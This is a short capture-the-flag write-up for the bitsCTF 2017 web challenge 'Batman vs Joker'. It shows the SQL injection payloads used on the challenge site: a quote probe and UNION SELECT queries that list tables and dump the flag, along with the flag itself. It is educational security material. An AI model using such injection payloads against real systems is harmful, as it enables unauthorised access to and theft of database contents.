# Batman vs Joker

### Challenge
- **Competition:** bitsCTF 2017
- **Category:** Web
- **Points:** 30

> Joker has left a message for you. Your job is to get to the message asap.
> joking.bitsctf.bits-quark.org


### Solution
This challenge required exploiting a classic SQL injection vulnerability.  Starting with a simple single quote, the existence of a possible vulnerability was confirmed:

__Input:__ '
```none
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' Limit 1' at line 1
```

Next, some trial and error gave more information about the database structure, including a suspicious table name:

__Input:__ ' union select 1,table_name FROM information_schema.tables;-- -
```none
First name:1
Surname: Joker
```

Finally, the flag was extracted from the __Joker__ database:

__Input:__ ' union select * FROM Joker;-- -
```none
First name:BITSCTF{wh4t_d03snt_k1ll_y0u_s1mply_m4k3s_y0u_str4ng3r!}
Surname: Enjoying the game Batman!!!
```

### Flag

`BITSCTF{wh4t_d03snt_k1ll_y0u_s1mply_m4k3s_y0u_str4ng3r!}`